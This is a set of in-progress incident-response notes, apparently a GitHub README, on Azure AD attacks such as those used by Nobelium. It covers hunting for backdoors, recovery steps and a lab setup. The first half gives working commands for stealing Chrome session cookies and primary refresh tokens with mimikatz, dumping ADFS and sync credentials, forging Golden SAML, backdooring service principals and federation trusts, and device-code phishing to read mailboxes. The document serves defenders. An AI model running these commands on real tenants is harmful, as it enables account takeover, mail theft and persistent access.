# Azure AD attack techniques and incident response

Rough in-progress notes on Azure AD attack techniques, including techniques used by Nobelium to gain long-term access to targets cloud identities and data. 

  * [Background reading on Azure AD and authentication](#background-reading-on-azure-ad-and-authentication)
  * [Background reading on attack techniques](#background-reading-on-attack-techniques)
  * [Background reading on attack techniques used in the SolarWinds related attacks](#background-reading-on-attack-techniques-used-in-the-solarwinds-related-attacks)
  * [Quick references](#quick-references)
  * [Reconnaissance against Azure AD tenants](#reconnaissance-against-azure-ad-tenants)
  * [Authenticated reconnaissance against Azure AD](#authenticated-reconnaissance-against-azure-ad)
  * [Using a compromised workstation to gain access to cloud identities and data](#using-a-compromised-workstation-to-gain-access-to-cloud-identities-and-data)
    + [Stealing the persistent authentication cookie from a compromised workstation](#stealing-the-persistent-authentication-cookie-from-a-compromised-workstation)
    + [Obtaining a refresh token from a compromised workstation](#obtaining-a-refresh-token-from-a-compromised-workstation)
    + [Stealing the primary refresh token from a compromised workstation](#stealing-the-primary-refresh-token-from-a-compromised-workstation)
    + [Dumping clear text credentials to authenticate to cloud services](#dumping-clear-text-credentials-to-authenticate-to-cloud-services)
  * [Using a compromised AD domain to gain access to cloud identities and data](#using-a-compromised-ad-domain-to-gain-access-to-cloud-identities-and-data)
    + [Stealing or modify token-signing certificates to perform a Golden SAML attack](#stealing-or-modify-token-signing-certificates-to-perform-a-golden-saml-attack)
    + [Compromising the AZUREADSSOACC account to forge Kerberos tickets](#compromising-the-azureadssoacc-account-to-forge-kerberos-tickets)
    + [Setting the password for an account in privileged cloud groups](#setting-the-password-for-an-account-in-privileged-cloud-groups)
    + [Dumping clear text credentials to accounts in privileged cloud groups](#dumping-clear-text-credentials-to-accounts-in-privileged-cloud-groups)
  * [Using a compromised cloud global admin account gain access to on-prem](#using-a-compromised-cloud-global-admin-account-gain-access-to-on-prem)
  * [Using a compromised third-party to gain access to cloud identities and data](#using-a-compromised-third-party-to-gain-access-to-cloud-identities-and-data)
  * [Using phishing attacks to gain access to cloud identities and data](#using-phishing-attacks-to-gain-access-to-cloud-identities-and-data)
    + [Consent grant phishing attack](#consent-grant-phishing-attack)
  * [Using password spraying to cloud accounts](#using-password-spraying-to-cloud-accounts)
  * [Gaining persistent access to cloud identities and data](#gaining-persistent-access-to-cloud-identities-and-data)
    + [Creating a new Service Principals to provide long-term API-based access](#creating-a-new-service-principals-to-provide-long-term-api-based-access)
    + [Adding credentials to an existing new Service Principals to provide long-term API-based access](#adding-credentials-to-an-existing-new-service-principals-to-provide-long-term-api-based-access)
    + [Configuring new or modifying existing federation trusts to perform Golden SAML attacks](#configuring-new-or-modifying-existing-federation-trusts-to-perform-golden-saml-attacks)
    + [Joining a fake device to Azure AD](#joining-a-fake-device-to-azure-ad)
    + [Dumping credentials for Azure resources](#dumping-credentials-for-azure-resources)
    + [Modify conditional access to add in MFA trusted IPs](#modify-conditional-access-to-add-in-mfa-trusted-ips)
  * [Pass the certificate](#pass-the-certificate)
  * [Hunting for backdoors](#hunting-for-backdoors)
    + [Commands to manually audit federation trusts](#commands-to-manually-audit-federation-trusts)
    + [Commands to manually audit service principals](#commands-to-manually-audit-service-principals)
      - [Review service principals with credentials](#review-service-principals-with-credentials)
    + [Review service principals with credentials and risky permissions](#review-service-principals-with-credentials-and-risky-permissions)
    + [Further hunting](#further-hunting)
  * [Recovering a compromised Azure AD environment](#recovering-a-compromised-azure-ad-environment)
  * [Azure Sentinel data sources to configure](#azure-sentinel-data-sources-to-configure)
  * [Notes on building a lab](#notes-on-building-a-lab)

## Background reading on Azure AD and authentication 

* [Microsoft ITOps | OPS108: Windows authentication internals in a hybrid world](https://techcommunity.microsoft.com/t5/itops-talk-blog/ops108-windows-authentication-internals-in-a-hybrid-world/ba-p/2109557)
* [Ignite | Deep-dive: Azure Active Directory Authentication and Single-Sign-On](https://channel9.msdn.com/Events/Ignite/Microsoft-Ignite-Orlando-2017/BRK3015)
* [OAuth 2.0 and OpenID Connect](https://www.youtube.com/watch?v=996OiexHze0&ab_channel=OktaDev)
* [Microsoft Identity Platform](https://docs.microsoft.com/en-us/azure/active-directory/develop/)
* [Microsoft Identity Platform | Service principles and applications](https://docs.microsoft.com/en-us/azure/active-directory/develop/app-objects-and-service-principals)
* [Microsoft Identity Platform | OAuth2 Code flow](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-auth-code-flow)
* [Microsoft Identity Platform | What is a Primary Refresh Token?](https://docs.microsoft.com/en-us/azure/active-directory/devices/concept-primary-refresh-token)
* [Microsoft 365 internals explained | Microsoft Graph, substrate, and PowerShell with Jeffrey Snover](https://www.youtube.com/watch?v=uuiTR8r27Os&ab_channel=MicrosoftMechanics)
* [Microsoft | Azure AD Authentication basics (6 videos)](https://www.youtube.com/watch?v=fbSVgC8nGz4&list=PLLasX02E8BPBm1xNMRdvP6GtA6otQUqp0&index=13&ab_channel=MicrosoftAzure)
* [Overview of the Microsoft identity platform for developers](https://www.youtube.com/watch?v=zjezqZPPOfc)
* [Detailed look at Windows Credentials](https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication?WT.mc_id=modinfra-12977-socuff)
* [Windows internals Version 7 Part 1 Chapter 7 Security](https://www.google.com/search?q=Windows+internals+Version+7+Part+1+Chapter+7&oq=Windows+internals+Version+7+Part+1+Chapter+7&aqs=chrome..69i57.211j0j4&sourceid=chrome&ie=UTF-8)

## Background reading on attack techniques
* [Attacking and Defending the Microsoft Cloud](https://adsecurity.org/wp-content/uploads/2019/08/2019-BlackHat-US-Metcalf-Morowczynski-AttackingAndDefendingTheMicrosoftCloud.pdf) [Video](https://www.youtube.com/watch?v=SG2ibjuzRJM&ab_channel=BlackHat)
* [DEF CON 25 | Gerald Steere, Sean Metcalf - Hacking the Cloud](https://www.youtube.com/watch?v=LufXEPTlPak&ab_channel=DEFCONConference)
* [TR19 | I'm in your cloud, reading everyone's emails - hacking Azure AD via Active Directory](https://www.youtube.com/watch?v=JEIR5oGCwdg&ab_channel=TROOPERScon)
* [PSCONFEU 2020 | Abusing Azure Active Directory: Who would you like to be today? - Nestori Syynimaa](https://www.youtube.com/watch?v=tJkjOnxcw6w&ab_channel=PowerShellConferenceEU)
* [Blachhat 2020 | My Cloud is APTs Cloud: Attacking and Defending O365](https://i.blackhat.com/USA-20/Thursday/us-20-Bienstock-My-Cloud-Is-APTs-Cloud-Investigating-And-Defending-Office-365.pdf)
* [BlueHat Seattle 2019 | I'm in your cloud: A year of hacking Azure AD](https://www.youtube.com/watch?v=fpUZJxFK72k&ab_channel=MicrosoftSecurityResponseCenter%28MSRC%29)
* [AD Attack and Defense](https://github.com/infosecn1nja/AD-Attack-Defense)

## Background reading on attack techniques used in the SolarWinds related attacks 
* [Detecting Post-Compromise Threat Activity in Microsoft Cloud Environments](https://us-cert.cisa.gov/ncas/alerts/aa21-008a)
* [Microsoft technical blog on SolarWinds attacks](https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/)
* [Microsoft blog on Azure Sentinel Post-Compromise Hunting](https://techcommunity.microsoft.com/t5/azure-sentinel/solarwinds-post-compromise-hunting-with-azure-sentinel/ba-p/1995095)
* [Microsoft advice for incident responders](https://www.microsoft.com/security/blog/2020/12/21/advice-for-incident-responders-on-recovery-from-systemic-identity-compromises/)
* [Microsoft blog on Identity IOCs](https://techcommunity.microsoft.com/t5/azure-active-directory-identity/understanding-quot-solorigate-quot-s-identity-iocs-for-identity/ba-p/2007610)

## Quick references 

* [Microsoft portals](https://msportals.io/)
* [Azure AD Red Team Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest.md)
* [Azure AD Red Team Cheat Sheet - Fork](https://github.com/rootsecdev/Azure-Red-Team)
* [Decoding JWTs](https://jwt.ms/)

## Reconnaissance against Azure AD tenants

```
https://login.microsoftonline.com/<DOMAIN>/.well-known/openid-configuration
https://login.microsoftonline.com/getuserrealm.srf?login=<USER>@<DOMAIN>&xml=1
https://login.microsoftonline.com/getuserrealm.srf?login=<USER>@<DOMAIN>&xml=1
```

```
PS> Get-AADIntLoginInformation -Domain <DOMAIN> 
PS> Invoke-AADIntReconAsOutsider -DomainName <DOMAIN> | Format-Table
```

A python tool to look at [detailed federation information](https://github.com/WillOram/AzureAD-incident-response/blob/main/azureadrecon.py). 

## Authenticated reconnaissance against Azure AD 

```
roadrecon auth [-h] [-u USERNAME] [-p PASSWORD] [-t TENANT] [-c CLIENT] [--as-app] [--device-code] [--access-token ACCESS_TOKEN] [--refresh-token REFRESH_TOKEN] [-f TOKENFILE] [--tokens-stdout]
roadrecon gather
roadrecon gui
```

## Using a compromised workstation to gain access to cloud identities and data 

### Stealing the persistent authentication cookie from a compromised workstation

Remote environment 

```
Copy-Item "$Env:localappdata\Google\Chrome\User Data\Default\Cookies" .\tmp\

Add-Type -AssemblyName System.Security
$localState = Get-Content "$Env:localappdata\Google\Chrome\User Data\Local State" | ConvertFrom-Json
$encryptedKey = [convert]::FromBase64String($localState.os_crypt.encrypted_key)
$chromeMasterKey = [System.Security.Cryptography.ProtectedData]::Unprotect(($encryptedKey | Select-Object -Skip 5), $null, 'CurrentUser')
[convert]::ToBase64String($chromeMasterKey) > .\tmp\chromeMasterKey
```

Local env

```
Function Convert-ByteArrayToHex {
    [cmdletbinding()]
    param(
        [parameter(Mandatory=$true)]
        [Byte[]]
        $Bytes
    )
    $HexString = [System.Text.StringBuilder]::new($Bytes.Length * 2)
    ForEach($byte in $Bytes){
        $HexString.AppendFormat("{0:x2}", $byte) | Out-Null
    }
    $HexString.ToString()
}

$base64MasterKey = Get-Content .\chromeMasterKey
$encryptedKey = Convert-ByteArrayToHex ([convert]::FromBase64String($base64MasterKey))
$cookiePath = (Resolve-Path Cookies).Path 
.\SharpChrome.exe  cookies /target:$cookiePath /statekey:$encryptedKey /cookie:"ESTSAUTHPERSISTENT" /format:json
```

### Obtaining a refresh token from a compromised workstation

* [Background on browser SSO](https://docs.microsoft.com/en-us/azure/active-directory/devices/concept-primary-refresh-token#browser-sso-using-prt)
* [Journey to Azure AD PRT: Getting access with pass-the-token and pass-the-cert](https://o365blog.com/post/prt/)
* [Abusing Azure AD SSO with the Primary Refresh Token](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)
* [Digging further into the Primary Refresh Token](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)
* [Requests AAD Refresh Token](https://github.com/leechristensen/RequestAADRefreshToken)

Key steps (user context):
* Request a PRT cookie and exchange for a (the PRT cookie expired after about 35 minutes)
* Request a refresh and access token from a Public application using a OAuth2 authorization code flow (the refresh token is valid for 90 days by default)  

### Stealing the primary refresh token from a compromised workstation 

* [Pass the PRT](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/) 

Key steps (local admin required):
* Extract PRT from LSASS
* Extract the Session Key and decrypt with DPAPI (TPM)
* Create a PRT cookie and exchange for a session cookie 

```
dsregcmd.exe /status
mimikatz.exe privilege::debug sekurlsa::cloudap
token::elevate dpapi::cloudapkd /keyvalue:[PASTE ProofOfPosessionKey HERE] /unprotect
```

### Dumping clear text credentials to authenticate to cloud services
* Useful if domain account is a high-privilege cloud account
* Enable WDigest with [Invoke-WdigestDowngrade.ps1](https://github.com/HarmJ0y/Misc-PowerShell/blob/master/Invoke-WdigestDowngrade.ps1)
* If MFA is required credentials could potentially be used through a proxy when Conditional Access policies not configured to require MFA from trusted locations 
* Check [MFASweep](https://github.com/dafthack/MFASweep)

## Using a compromised AD domain to gain access to cloud identities and data 

### Stealing or modify token-signing certificates to perform a Golden SAML attack

* Stealing token-signing certificates from on-premises ADFS servers to forge SAML tokens "Golden SAML" attack. 
* Allows anyone with the certificate to impersonate any user to Azure AD. 
* Can steal token-signing certificates to ADFS or add an alternative token-signing certificate
* [Export Active Directory Federation Services (AD FS) Token Signing Certificate](https://github.com/Azure/SimuLand/blob/main/3_simulate_detect/credential-access/exportADFSTokenSigningCertificate.md)
* [FireEye Azure AD backdoors](https://www.fireeye.com/blog/threat-research/2020/09/detecting-microsoft-365-azure-active-directory-backdoors.html)

Export ADFS configuration: 
```
PS> $ADFS = Get-WmiObject -Namespace root/ADFS -Class SecurityTokenService  
PS> $conn = $ADFS.ConfigurationDatabaseConnectionString  
PS> $SQLclient = new-object System.Data.SqlClient.SqlConnection -ArgumentList $conn  
PS> $SQLclient.Open()  
PS> $SQLcmd = $SQLclient.CreateCommand()  
PS> $SQLcmd.CommandText = "SELECT ServiceSettingsData from IdentityServerPolicy.ServiceSettings"  
PS> $SQLreader = $SQLcmd.ExecuteReader()  
PS> $SQLreader.Read() | Out-Null  
PS> $settings=$SQLreader.GetTextReader(0).ReadToEnd()  
PS> $SQLreader.Dispose()  
PS> \[xml\]$xml=$settings  
```
ADFSDump https://github.com/fireeye/ADFSDump

### Compromising the AZUREADSSOACC account to forge Kerberos tickets

* [https://o365blog.com/post/on-prem_admin/](https://o365blog.com/post/on-prem_admin/)
* Dump the hash for the account AZUREADSSOACC using dcsync or from NTDS.DIT
* Forge Kerberos tickets for users synced with Azure AD 

### Setting the password for an account in privileged cloud groups

* Compromise Azure AD connector account (stored in a local configuration database)
* [https://o365blog.com/post/on-prem_admin/](https://o365blog.com/post/on-prem_admin/)

```
$creds = Get-AADIntSyncCredentials
Get-AADIntAccessTokenForAADGraph -Credentials $creds -SaveToCache
Get-AADIntSyncObjects | Select UserPrincipalName,SourceAnchor,CloudAnchor | Sort UserPrincipalName
Set-AADIntUserPassword ...
```

Using a compromised AD sync accounts [I'm in your cloud tenant](https://dirkjanm.io/assets/raw/Im%20in%20your%20cloud%20bluehat-v1.0.pdf)
* Dump all on-premise password hashes (if PHS is enabled)
• Log in on the Azure portal (since it’s a user)
• Bypass conditional access policies for admin accounts
• Add credentials to service principals
• Modify service principals properties
• Modify/backdoor/remove conditional access policies (internal API)

### Dumping clear text credentials to accounts in privileged cloud groups
* Credential dumping and lateral movement
* DCsync / NTDTS etc. 
* If MFA is required credentials could potentially be used through a proxy when Conditional Access policies not configured to require MFA from trusted locations 
* Check [MFASweep](https://github.com/dafthack/MFASweep)

## Using a compromised cloud global admin account gain access to on-prem 

* [Death from above](https://posts.specterops.io/death-from-above-lateral-movement-from-azure-to-on-prem-ad-d18cb3959d4d)

## Using a compromised third-party to gain access to cloud identities and data 

* Stealing the certificates used for service principals (see the attack against Mimecast)

## Using phishing attacks to gain access to cloud identities and data 

* [Introducing a new phishing technique for compromising Office 365 accounts](https://o365blog.com/post/phishing/)
* [The art of the device code phish](https://0xboku.com/2021/07/12/ArtOfDeviceCodePhish.html)
* The user code is valid only for 15 minutes

```
> Get-AzureToken -Client Graph
> RefreshTo-MSGraphToken -refreshToken $response.refresh_token -domain <DOMAIN> -Device iPhone -Browser Safari
> Dump-OWAMailboxViaMSGraphApi -AccessToken $MSGraphToken.access_token -mailFolder inbox -top 1 -Device iPhone -Browser Safari
```

Uses Microsoft Office client id d3590ed6-52b3-4102-aeff-aad2292ab01c

### Consent grant phishing attack

* todo

## Using password spraying to cloud accounts

* [MSOLSpray](https://github.com/dafthack/MSOLSpray)

## Gaining persistent access to cloud identities and data 

### Creating a new Service Principals to provide long-term API-based access 

```
PS> Get-AzureADServicePrincipal -all $true | Where-Object{$\_.KeyCredentials -ne $null}  
PS> $sp = New-AzADServicePrincipal -DisplayName 'MicrosoftSyncShare'  
PS> New-AzureADServicePrincipalKeyCredential -objectid $sp.ObjectId -EndDate "01-01-2022 12:00:00" -StartDate "01-03-2021 14:12:00" -CustomKeyIdentifier "Test" -Type AsymmetricX509Cert -Usage Verify -Value $keyValue  
```

### Adding credentials to an existing new Service Principals to provide long-term API-based access

```
PS> $cert = New-SelfSignedCertificate -dnsname some.domain.com -CertStoreLocation cert:\LocalMachine\My -Provider “Microsoft Enhanced RSA and AES Cryptographic Provider”  
PS> $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())   
PS> $sp = get-azureadserviceprincipal -searchstring SEARCHSTRING  
PS> New-AzureADServicePrincipalKeyCredential -objectid $sp.ObjectId -EndDate "01-01-2022 12:00:00" -StartDate "01-03-2021 14:12:00" -CustomKeyIdentifier "Test" -Type AsymmetricX509Cert -Usage Verify -Value $keyValue  
PS> Connect-AzureAD  -Tenant TENANTID -ApplicationID APPID -CertificateThumbprint CERTTHUMBPRINT  
```

Creates the Azure AD audit log event "Add service principal credentials"

```
PS> New-AzureADServicePrincipalPasswordCredential -objectid $sp.ObjectId -EndDate "01-01-2030 12:00:00" -StartDate "04-04-2020 12:00:00"  -Value PASSWORD  
```
Creates the Azure AD audit log event "Add service principal credentials"

### Configuring new or modifying existing federation trusts to perform Golden SAML attacks

* Adding new federation trusts to or modifying existing federation trusts to add new token-signing certificates, to forge SAML authentication tokens

```
PS> Get-AADIntAccessTokenForAADGraph -savetocache                                                                       
PS> ConvertTo-AADIntBackdoor -domain maliciousdomain.com     
PS> get-msoluser | select UserPrincipalName, ImmutableId  
PS> Open-AADIntOffice365Portal -ImmutableID $id -UseBuiltInCertificate -ByPassMFA $true -Issuer ISSUER  
```
Creates the Azure AD audit log event "Set domain authentication"

```
PS> Get-MSOLUser | Where-Object{$\_.DisplayName -eq 'Will'} | select UserPrincipalName, ImmutableId  
PS> Get-MsolDomainFederationSettings -DomainName $domainname | Select IssuerUri  
PS> Get-MsolDomainFederationSettings -DomainName $domainname | Select *  
PS> Set-MsolDomainFederationSettings -DomainName $domainname -NextSigningCertificate $malicious_cert  
PS> Get-MsolDomainFederationSettings -DomainName $domainname | Select *  
PS> Open-AADIntOffice365Portal -ImmutableID $id -UseBuiltInCertificate -ByPassMFA $true -Issuer $issueruri  
```

AuditLogs | where OperationName =~ "Set federation settings on domain"

### Joining a fake device to Azure AD

* [Journey to Azure AD PRT: Getting access with pass-the-token and pass-the-cert](https://o365blog.com/post/prt/)

```
Join-AADIntDeviceToAzureAD -DeviceName "My computer" -DeviceType "Commodore" -OSVersion "C64"
$prtKeys = Get-AADIntUserPRTKeys -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx
```

### Dumping credentials for Azure resources

* [Microburst] (https://github.com/NetSPI/MicroBurst)
* [Get-AzPassword](https://www.netspi.com/blog/technical/cloud-penetration-testing/a-beginners-guide-to-gathering-azure-passwords/)
* [Azure PrivEsc](https://www.youtube.com/watch?v=OES9RU0WTH0&ab_channel=DEFCONConference)

```
Import-Module Microburst.psm1
Get-AzurePasswords
Get-AzurePasswords -Verbose | Out-GridView
```
### Modify conditional access to add in MFA trusted IPs

## Pass the certificate

* [Azure AD Pass The Certificate](https://medium.com/@mor2464/azure-ad-pass-the-certificate-d0c5de624597)

## Hunting for backdoors 

* Audit federation trusts
* Audit service principal credentials, permissions and reply URLs
* Audit conditional access rules 
* Hunt for suspicious AD Sync account logons 
* Hunt for modifications to conditional access rules 
* Hunt for suspicious sign-ins by service principals (Using AADServicePrincipalSignInLogs logs. Requires additional configuration to be sent to Sentinel)
* Hunt for service principals accessing users' mailboxes (MailItemsAccessed log is enabled by default for users that are assigned an Office 365 or Microsoft 365 E5 license or for organizations with a Microsoft 365 E5 Compliance add-on subscription. The MailItemsAccessed mailbox auditing action covers all mail protocols: POP, IMAP, MAPI, EWS, Exchange ActiveSync, and REST.)


```
PS> Install-module AzureADPreview -AllowClobber
PS> Connect-AzureAD  

PS> Install-module ExchangeOnlineManagement  
PS> Connect-ExchangeOnline  

PS> Install-module MSOnline  
PS> Connect-MsolService  

PS> Install-Module AZ
PS> Connect-AzAccount

PS> # CISA's Sparrow  
PS> Invoke-WebRequest 'https://github.com/cisagov/Sparrow/raw/develop/Sparrow.ps1' -OutFile 'Sparrow.ps1' -UseBasicParsing   
PS> .\Sparrow.ps1  

PS> # CrowdStrike's Azure Reporting Tool (CRT)  
PS> Invoke-WebRequest 'https://github.com/CrowdStrike/CRT/raw/main/Get-CRTReport.ps1' -OutFile 'Get-CRTReport.ps1' -UseBasicParsing  
PS> .\Get-CRTReport.ps1  

PS> # AzureHound  
PS> Invoke-WebRequest 'https://raw.githubusercontent.com/BloodHoundAD/AzureHound/master/AzureHound.ps1' -OutFile 'AzureHound.ps1' -UseBasicParsing  
PS> . .\AzureHound.ps1  
PS> Invoke-AzureHound  

PS> # Hawk
PS> Install-module hawk
PS> start-hawktenantinvestigation  
```

### Commands to manually audit federation trusts

**Azure AD**

PS> Get-MsolDomain | Format-List 
PS> Get-AzureADDomain | Format-List (newer version of the command above)
PS> Get-MsolFederationProperty -DomainName ******* | Format-List

**Exchange Online** (unclear if these can be changed, Exchange Online PowerShell APIs to configure these state they only work for on-prem Exchange)

PS> Get-FederationTrust | Format-List
PS> Get-FederatedOrganizationIdentifier -IncludeExtendedDomainInfo  | Format-List
PS> Get-FederatedOrganizationIdentifier -IncludeExtendedDomainInfo | select-object -expandproperty Domains  

### Commands to manually audit service principals

* CISA Sparrow script provides the best data for this
* Audit the creation and use of credentials for service principal. 
* Review the permissions assigned to service principles. 
* Audit the assignment of credentials to applications that allow non-interactive sign-in by the application and permissions for the Microsoft Graph API.
* Look for unusual application usage, such as use of dormant applications.

#### Review service principals with credentials 

```
PS> Get-AzureADServicePrincipal  
PS> Get-AzureADServicePrincipal -all $true | Where-Object{$\_.KeyCredentials -ne $null} | Select *  
PS> Get-AzureADServicePrincipal -all $true | Where-Object{$\_.PasswordCredentials -ne $null} | Select *   
```

### Review service principals with credentials and risky permissions 

See scripts output in Sparrow and CRT tool.  

```
PS> # Get Service Principal using objectId  
PS> $sp = Get-AzureADServicePrincipal -ObjectId "OBJECTID"    

PS> # Get Azure AD App role assignments using objectID of the Service Principal (users)  
PS> $assignments = Get-AzureADServiceAppRoleAssignment -ObjectId $sp.ObjectId -All $true   

PS> # Get all delegated permissions for the service principal  
PS> $spOAuth2PermissionsGrants = Get-AzureADOAuth2PermissionGrant -All $true| Where-Object {$\_.clientId -eq $sp.ObjectId} | Format-List  

PS> # Get all application permissions for the service principal  
PS> $spApplicationPermissions = Get-AzureADServiceAppRoleAssignedTo -ObjectId $sp.ObjectId -All $true | Where-Object { $\_.PrincipalType -eq "ServicePrincipal" }

PS> # Get all application permissions to Microsoft Graph for the service principal  
PS> $spApplicationPermissions = Get-AzureADServiceAppRoleAssignedTo -ObjectId $sp.ObjectId -All $true | Where-Object {$\_.DisplayName -eq "Microsoft Graph"}    

PS> # Look up Microsoft Graph permissions    
PS> $GraphSP = Get-AzureADServicePrincipal -All $true | Where-Object {$\_.DisplayName -eq "Microsoft Graph"}    
PS> $GraphAppRoles = $GraphSP.AppRoles | Select-Object -Property AllowedMemberTypes, Id, Value    
PS> $GraphAppRoles| Where-Object {$\_.Id -eq "e2a3a72e-5f79-4c64-b1b1-878b674786c9" -or $\_.Id -eq "810c84a8-4a9e-49e6-bf7d-12d183f40d01"}    
```

App permissions reference https://docs.microsoft.com/en-us/graph/permissions-reference   

List of risky app permissions https://github.com/mepples21/azureadconfigassessment  

Creat a test app https://docs.microsoft.com/en-gb/azure/active-directory/develop/quickstart-v2-javascript   

Microsoft blog references Mail.Read and Mail.ReadWrite

Mimecast: Mimecast ask organisations to add an application/service principal to Azure AD and add a certificate to that service principal, allowing Mimecast to authenticate to it. They then ask organisations to assign that service principal the permissions __full_access_as_app__ to __Office 365 Exchange Online__. See: https://community.mimecast.com/s/article/Creating-an-Office-365-Association-for-Server-Connections-1061681132

### Further hunting 

* [Crowdstrike blog on hunting for modifications](https://www.crowdstrike.com/blog/crowdstrike-launches-free-tool-to-identify-and-help-mitigate-risks-in-azure-active-directory/) There is a good list in here of what to search for in Azure AD that goes further than the above including:
  * Reviewing trust relationships with partners including IT consultants, vendors and resellers 
  * Reviewing Azure AD allowed identity providers (SAML IDPs through direct federation or social logins)
  * Reviewing Azure B2B external identities’ access to the Azure portal 
  * Review environment for overly privileged service accounts that may have access to Azure  
 
Use of token-signing certificates to spoof SAML tokens. Azure AD UserAuthenticationMethod: 16457 indicates a password with MFA was satisfied by a federated identity provider: https://twitter.com/ItsReallyNick/status/1349536271010574338?s=20

## Recovering a compromised Azure AD environment 

* Reset all privileged accounts in Azure AD 
* Invalidate refresh tokens issues for users (Revoke-AzureADUserAllRefreshToken)
* Audit service principal credentials
* Audit service principal permissions and reply URLs 
* Audit federation settings and verified domains
* Rotate the AD FS token-signing and token-decrypting certificates 

On-prem:
* AZUREADSSOACC account 
* On-premises AD DS connector account 
* Azure AD connector account 
* On-premises ADSync Service Account 
* Reset local accounts on DCs
* Rotate the AD FS token-signing and token-decrypting certificates 
* Kerberos ticket granting ticket account twice 
* Reset all service accounts 
* Rotating secrets associated with remote access MFA token generation 

## Azure Sentinel data sources to configure

* AzureActiveDirectory (if not already onboarded to Azure Sentinel retained for 30 days in Azure Azure Active Directory)
  * Azure AD Audit Logs
  * Azure AD Sign-In Logs
  * Azure AD Managed Identity Sign-In Logs (Preview) (Needs to be configured in Azure AD diagnostic settings)
  * Azure AD Non-Interactive User Sign-In Logs (Preview) (Needs to be configured in Azure AD diagnostic settings)
  * Azure AD Service Principal Sign-In Logs (Preview) (Needs to be configured in Azure AD diagnostic settings)
  * Azure AD Provisioning Logs (Needs to be configured in Azure AD diagnostic settings)
  * Azure AD Risky Sign-In events (Needs to be configured in Azure AD diagnostic settings)
* SecurityEvents - with process creation auditing configured on tier 0 systems (if Defender is not deployed and DeviceProcessEvents can be used)
* Office365 - OfficeActivity (Exchange Online, OneDrive, Teams) (if not already onboarded to Sentinel retained for 90 days E3 / 1 year E5 in the Unified Audit Logs. These have to be manually enabled by the organisation.)
* Microsoft 365 Defender - includes MDATP raw data
* Microsoft Defender for Endpoint
* AzureMonitor (IIS)

## Notes on building a lab

* Purchase a test domain name. 
* Use Let's Encrypt to issue a wildcard certificate for the domain name. 
* Configure an Azure AD tenant and configure the domain as a custom domain. 
* Deploy three Windows Servers in Azure, and one test workstation. 
* Setup one of the Windows Servers as a domain controller, use the same domain name as previously registered. 
* Domain join all the other systems (after configuring the DC as the DNS server for the VNet). 
* Use AD Connect to configure federation with Azure AD, including configuring the ADFS server and the WAP. 
* Configure 443 access to the WAP from the internet.
* Configure Azure Sentinel, onboard the security logs from all systems and the Azure AD audit logs. 
* Configure the diagnostic settings for Azure AD to collect all logs data types. 
* Enable audit logging in the Security & Compliance Center. 
* Create and configure a test application in Azure AD, configure Mail.Read permissions. Use the web application quick-start to log-in test users to the app and require them to consent access to their data. 
* Create and configure a test application in Azure AD, configure Mail.Read permissions. Grant [admin consent](https://docs.microsoft.com/en-us/azure/active-directory/manage-apps/grant-admin-consent) to the application. 
